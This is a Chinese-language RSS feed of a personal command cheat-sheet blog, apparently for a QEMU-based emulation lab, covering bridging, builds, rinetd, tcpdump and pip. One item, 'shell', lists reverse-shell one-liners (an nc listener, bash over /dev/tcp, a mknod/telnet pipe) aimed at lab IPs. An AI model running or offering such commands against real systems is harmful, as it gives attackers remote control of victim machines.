<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>note on CAI dog</title>
    <link>https://jellyfish-pro.github.io/note/</link>
    <description>Recent content in note on CAI dog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language><atom:link href="https://jellyfish-pro.github.io/note/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>[置顶] 注意事项</title>
      <link>https://jellyfish-pro.github.io/note/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</guid>
      <description>这里总结了一些可以快速使用的命令，并不会涉及原理，如果您使用这些命令后报错或者是没有达到效果，请不要在此过多的纠结 </description>
    </item>
    
    <item>
      <title>qemu-system桥接设置</title>
      <link>https://jellyfish-pro.github.io/note/qemu-system%E6%A1%A5%E6%8E%A5%E8%AE%BE%E7%BD%AE/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/qemu-system%E6%A1%A5%E6%8E%A5%E8%AE%BE%E7%BD%AE/</guid>
      <description>设置桥接的命令：
sudo ifconfig ens33 down # 先停用host的网卡sudo brctl addbr br0 # 添加名为br0的网桥sudo brctl addif br0 ens33 # 将host的网卡插到网桥br0上sudo brctl stp br0 off # 如果只有一个网桥，则关闭生成树协议sudo ifconfig br0 0.0.0.0 promisc up # 启用br0网桥，不分配ip，混杂模式sudo ifconfig ens33 0.0.0.0 promisc up # 启用host网卡，不分配ip，混杂模式sudo dhclient br0 # 让网桥从dhcp获取ipsudo tunctl -t tap0 # 创建一个tap网络设备，名字为tap0sudo brctl addif br0 tap0 # 将tap0插到网桥sudo ifconfig tap0 0.0.0.0 promisc up # 启用tap0，不分配ip，混杂模式 启动qemu-system的命令：</description>
    </item>
    
    <item>
      <title>qemu编译</title>
      <link>https://jellyfish-pro.github.io/note/qemu%E7%BC%96%E8%AF%91/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/qemu%E7%BC%96%E8%AF%91/</guid>
      <description>在ubuntu上直接使用 sudo apt install qemu安装qemu时，会遇到因为qemu版本过低导致模拟环境出现问题（例如：二进制文件是32位，但是在模拟出的环境中二进制文件的地址是8字节的情况）
为了避免这种情况，我们需要放弃apt安装，转而选择自行编译高版本的qemu。
我们可以在git的官网上下载最新版本的源码，或者在[仓库](Index of / (qemu.org))中寻找之前的版本，亦或者是在[官方的gitlab](QEMU / QEMU · GitLab)上寻找想要的版本
当我们拿到源码后，先安装依赖
sudo apt build-dep qemu 而后进入qemu源码文件夹进行配置：
./configure \--prefix= ~/qemu-user-static \ #这个选项是指定安装位置，我是直接安装到home目录下--static \ #指示静态链接--disable-system \ #不编译系统仿真程序--enable-linux-user #编译所有架构的用户态仿真程序 注意：
静态编译的时候需要指定&amp;ndash;disable-system选项，因为带softmmu 后缀的编译目标（即系统仿真程序）无论如何都会用到一些共享库，因此如果在指定了&amp;ndash;static选项但没有指定&amp;ndash;disable-system选项会导致后面的链接阶段报错。
编译，安装：
makemake install 最后给所有编译得到的目标重命名，为其添加一个&amp;quot;-static&amp;quot;后缀，这样qemu-debootstrap可以识别：
cd qemu-user-static/binfor i in *; do cp $i $i-static; done </description>
    </item>
    
    <item>
      <title>rinetd端口转发</title>
      <link>https://jellyfish-pro.github.io/note/rinetd%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/rinetd%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</guid>
      <description>rinetd是一个在linux上的端口转发工具。
安装方式 在github上搜索rinetd就可以找到官方仓库
安装命令在README里也有写：
./bootstrap./configure –prefix=/home/shangdi4sb/rinetd #home目录下makemake install 需要注意的是 configure时填写安装目录，我个人是习惯安装在home目录下
配置文件 配置文件的位置为：&amp;lt;安装目录&amp;gt;/etc/rinetd.conf
我们直接打开文件，按照如下格式写入内容就可以了，不需要理会配置文件原有的内容：
bindadress bindport connectaddress connectport监听的ip 监听ip的端口 转发的ip 转发ip的端口 例如我想把本地8080端口的数据转发到qemu(192.168.113.129)的80端口上
0.0.0.0 8080 192.168.113.129 80 启动rinetd rinetd的二进制文件存默认放在：&amp;lt;安装目录&amp;gt;/etc/rinetd.conf
使用如下命令：
./sbin/rinetd -f -c ./etc/rinetd.conf -f 不使用后台模式，一般使用这个参数是为了看报错
-c 指定配置文件</description>
    </item>
    
    <item>
      <title>shell</title>
      <link>https://jellyfish-pro.github.io/note/shell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/shell/</guid>
      <description>一般选择反弹shell 攻击机：
nc -lnvp 8080 目标机：
bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.113.128/8080 0&amp;gt;&amp;amp;1或bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.113.128/8080 0&amp;gt;&amp;amp;1&amp;#34; 或者
mknod /ram/f p; /bin/telnet 192.168.113.128 8080 &amp;lt; /ram/f | /bin/bash &amp;gt;/ram/f 2&amp;gt;&amp;amp;1 mknod：创建名为 /ram/f的管道
若在脚本中使用：
rm /tmp/f;mknod /tmp/f p;/bin/telnet 192.168.1.3 8080 &amp;lt; /tmp/f |/bin/bash &amp;gt;/tmp/f 2&amp;gt;/tmp/f </description>
    </item>
    
    <item>
      <title>tcpdump快速使用</title>
      <link>https://jellyfish-pro.github.io/note/tcpdump%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/tcpdump%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8/</guid>
      <description>在windows上可以使用burpsuite进行抓包。但burpsuite在linux上不便于安装。
在linux上我们可以使用tcpdump命令。
具体安装流程我们略过，如要安装可以直接百度。
通过host参数进行IP地址过滤：
tcpdump -n host 192.168.110.129 -n表示不把ip解析成域名
scr可以筛选来源地址：
tcpdump scr 192.168.110.129 dst可以筛选目的地址：
tcpdump dst 192.168.110.129 port指定端口
tcpdump port 8080 若要指定协议，则直接输入就好了：
tcpdump tcp或者tcpdump icmp </description>
    </item>
    
    <item>
      <title>ubuntu20 无setuptools下安装pip</title>
      <link>https://jellyfish-pro.github.io/note/ubuntu20-%E6%97%A0setuptools%E4%B8%8B%E5%AE%89%E8%A3%85pip/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/ubuntu20-%E6%97%A0setuptools%E4%B8%8B%E5%AE%89%E8%A3%85pip/</guid>
      <description>Ubuntu20及以上版本，虽会自带python2，但python2中不会自带pip和setuptools这两个模块。
同时使用Ubuntu20及以上版已经将python-pip移除apt库。
故，我们不能使用tar.gz安装pip和apt安装pip。
这时我们可以去pipy下载对应python2的pip源码：
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py -O get-pip.pypython get-pip.py </description>
    </item>
    
    <item>
      <title>报错read-only file system解决方法</title>
      <link>https://jellyfish-pro.github.io/note/%E6%8A%A5%E9%94%99read-only-file-system%E7%BB%93%E5%B1%80%E6%96%B9%E6%B3%95/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/%E6%8A%A5%E9%94%99read-only-file-system%E7%BB%93%E5%B1%80%E6%96%B9%E6%B3%95/</guid>
      <description>mount -o remount,rw / 使用mount命令重新挂载根目录，给一个可读可写的权限</description>
    </item>
    
  </channel>
</rss>
